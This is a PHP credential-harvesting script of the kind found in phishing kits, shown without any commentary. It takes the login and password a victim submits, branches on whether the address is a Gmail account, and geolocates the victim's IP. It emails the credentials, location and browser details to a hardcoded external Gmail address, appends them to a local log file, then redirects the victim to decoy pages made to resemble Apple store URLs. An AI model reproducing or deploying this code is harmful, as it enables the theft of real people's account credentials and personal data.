<?php
$login = $_REQUEST['login'];
$password = $_REQUEST['password'];

$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
 if($len[$i] == "@"){
  $x = $i;
  break;
 }
}

$yuh = substr($len,0,$x);

$yuh = strrev($yuh);


for($i=0; $i<$ln; $i++){
 if($yuh[$i] == "."){
  $x = $i;
  break;
 }
}

if ($yuh == "gmail.com") {	

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Em: ".$_POST['login']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'EMS POST';
$subj = "$geoplugin->ip | $geoplugin->countryCode | $geoplugin->countryName";
$from = "From: $domain<west>\n";
mail("millergreg.greg435@gmail.com",$subj,$message,$from,$domain);


$fp = fopen("lek.txt","a");
fputs($fp,$message);
fclose($fp);


header("Location: verification.php?c=aHR0cDovL3d3dy&login=$login&5hcHBsZS5jb20vc2hvcHwxYW9zNGJjMzU3MDM3ZTc1NmQ3NGY4MTI3ZGZhMWNkNDBlNWZkNGY0MWNhZQ&r=SDHCD9JUYKX777H9KT9JT7JJTAPAXHFKH&s=aHR0cHM6Ly9zZWN1cmUyLnN0b3JlLmFwcGxlLmNvbS9zaG9");
}
else {

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "E: ".$_POST['login']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'EMS POST';
$subj = "$geoplugin->ip | $geoplugin->countryCode | $geoplugin->countryName";
$from = "From: $domain<west>\n";
mail("millergreg.greg435@gmail.com",$subj,$message,$from,$domain);

$fp = fopen("lek.txt","a");
fputs($fp,$message);
fclose($fp);

header("Location: go.php");
	
}
?>
